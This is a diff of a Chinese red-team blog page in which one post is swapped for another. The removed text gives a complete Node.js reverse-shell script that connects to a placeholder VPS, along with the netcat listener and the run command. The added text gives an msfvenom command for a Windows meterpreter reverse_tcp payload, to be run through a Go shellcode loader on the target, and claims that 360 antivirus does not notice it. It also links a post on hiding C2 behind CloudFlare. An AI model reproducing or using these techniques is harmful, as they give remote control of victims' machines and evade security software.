@@ -2,19 +2,18 @@
   <head>
     <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>node.js反弹shell | rebootORZ</title>
+<title>[Go免杀] shellcode 分离免杀-2 | rebootORZ</title>
 <link rel="shortcut icon" href="https://rebootorz.github.io/favicon.ico?v=1612850381178">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
 <link rel="stylesheet" href="https://rebootorz.github.io/styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="node.js反弹shell | rebootORZ - Atom Feed" href="https://rebootorz.github.io/atom.xml">
+<link rel="alternate" type="application/atom+xml" title="[Go免杀] shellcode 分离免杀-2 | rebootORZ - Atom Feed" href="https://rebootorz.github.io/atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
 
-    <meta name="description" content="当环境中有node时，创建shell.js如下：
-**注：**如果没有node.js可以直接安装一下：apt-get install node / yum install node
-(function()){
-    var net = r..." />
+    <meta name="description" content="项目地址：https://github.com/brimstone/go-shellcode
+使用MSF生成hex shell code：
+msfvenom -p windows/x64/meterpreter/reverse_tcp  L..." />
     <meta name="keywords" content="红队" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
     <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
@@ -83,11 +82,11 @@
         <div class="post-detail">
           <article class="post">
             <h2 class="post-title">
-              node.js反弹shell
+              [Go免杀] shellcode 分离免杀-2
             </h2>
             <div class="post-info">
               <span>
-                2021-01-15
+                2021-02-09
               </span>
               <span>
                 1 min read
@@ -101,29 +100,12 @@
             
             <div class="post-content-wrapper">
               <div class="post-content">
-                <p>当环境中有node时，创建shell.js如下：<br>
-**注：**如果没有node.js可以直接安装一下：apt-get install node / yum install node</p>
-<pre><code>(function()){
-    var net = require(&quot;net&quot;),
-    cp = require(&quot;child_process&quot;),
-    sh = cp.spawn(&quot;/bin/sh&quot;,[]);
-    var client = new net.Socket();
-    client.connect(端口,&quot;VPS&quot;,function(){
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);    
-    });
-    return /a/;
-})();
-</code></pre>
-<p>VPS监听：</p>
-<pre><code>nc -lvvp 端口
-</code></pre>
-<p>运行：</p>
-<pre><code>node shell.js
-</code></pre>
-<p>VPS获取到反弹的shell:<br>
-<img src="https://rebootorz.github.io/post-images/1610690975077.png" alt="" loading="lazy"></p>
+                <p>项目地址：https://github.com/brimstone/go-shellcode</p>
+<p>使用MSF生成hex shell code：<br>
+msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=xxx LPORT=4444 -f hex<br>
+在目标机器执行：<br>
+main.exe  hex代码</p>
+<p>这个方法360无感知。</p>
 
               </div>
               <div class="toc-container">
@@ -136,9 +118,9 @@
         
           <div class="next-post">
             <div class="next">下一篇</div>
-            <a href="https://rebootorz.github.io/HdxsJLVVU/">
+            <a href="https://rebootorz.github.io/z9xOXiKxp/">
               <h3 class="post-title">
-                Invoke-Obfuscation实现ps1脚本免杀
+                利用CloudFlare隐藏C2
               </h3>
             </a>
           </div>
